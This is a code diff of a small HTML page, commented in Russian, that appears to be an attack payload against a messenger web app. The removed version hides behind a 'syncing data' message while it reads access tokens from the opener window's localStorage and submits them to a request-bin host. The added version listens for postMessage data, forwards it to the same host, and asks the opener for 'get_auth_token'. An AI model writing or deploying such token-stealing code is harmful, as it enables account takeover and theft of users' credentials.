@@ -1,44 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
-<body>
-    <div id="status">Синхронизация данных...</div>
-    
-    <form id="stealForm" action="https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4" method="GET">
-        <input type="hidden" name="token_leak" id="tokenField">
-        <input type="hidden" name="debug_info" id="debugField">
-    </form>
+<script>
+    // Слушаем все сообщения, которые мессенджер может слать в открытые окна
+    window.addEventListener("message", function(event) {
+        fetch('https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4?postmessage_leak=' + JSON.stringify(event.data));
+    }, false);
 
-    <script>
-        (function() {
-            var form = document.getElementById('stealForm');
-            var field = document.getElementById('tokenField');
-            var debug = document.getElementById('debugField');
-
-            try {
-                // Пытаемся найти хоть какую-то зацепку
-                var opener = window.opener || window.parent;
-                
-                if (opener) {
-                    // Пробуем разные варианты имен токенов
-                    var t = opener.localStorage.getItem('token') || 
-                            opener.localStorage.getItem('access_token') || 
-                            "not_accessible_via_js";
-                    
-                    field.value = t;
-                    debug.value = "OpenerFound_Domain_" + document.domain;
-                } else {
-                    debug.value = "NoOpener_NoParent";
-                }
-            } catch (e) {
-                debug.value = "SOP_Error: " + e.message;
-            }
-
-            // Отправляем форму через 500мс (это обходит многие запреты на fetch)
-            setTimeout(function() {
-                form.submit();
-            }, 500);
-        })();
-    </script>
-</body>
-</html>
+    // Пытаемся спровоцировать мессенджер прислать нам что-то
+    if (window.opener) {
+        window.opener.postMessage("get_auth_token", "*"); 
+    }
+</script>
